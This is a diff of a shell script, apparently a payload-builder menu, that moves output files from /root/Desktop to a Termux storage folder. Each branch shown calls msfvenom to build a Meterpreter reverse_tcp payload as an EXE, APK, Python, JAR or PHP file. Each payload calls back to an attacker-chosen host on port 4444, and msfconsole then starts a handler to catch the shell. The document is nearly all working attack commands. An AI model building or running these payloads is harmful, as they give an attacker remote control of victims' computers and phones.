@@ -56,7 +56,7 @@ me='10'
 read x
 
 if [ "$x" == "$exe" ]; then                    #EXE
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/test.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/data/data/com.termux/files/home/storage/test.exe
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -71,7 +71,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/re
 
 
 elif [ "$x" == "$apk" ]; then                          #APK
-msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.apk
+msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/data/data/com.termux/files/home/storage/test.apk
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -88,7 +88,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/re
 
 
 elif [ "$x" == "$py" ]; then                       #PYTHON
-msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.py
+msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/data/data/com.termux/files/home/storage/test.py
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -104,7 +104,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/rev
 
 
 elif [ "$x" == "$jar" ]; then                        #JAVA
-msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/test.jar
+msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/data/data/com.termux/files/home/storage/test.jar
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
@@ -123,7 +123,7 @@ msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/rever
 
 
 elif [ "$x" == "$php" ]; then                        #PHP
-msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/test.php
+msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/data/data/com.termux/files/home/storage/test.php
 echo -e '
 
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
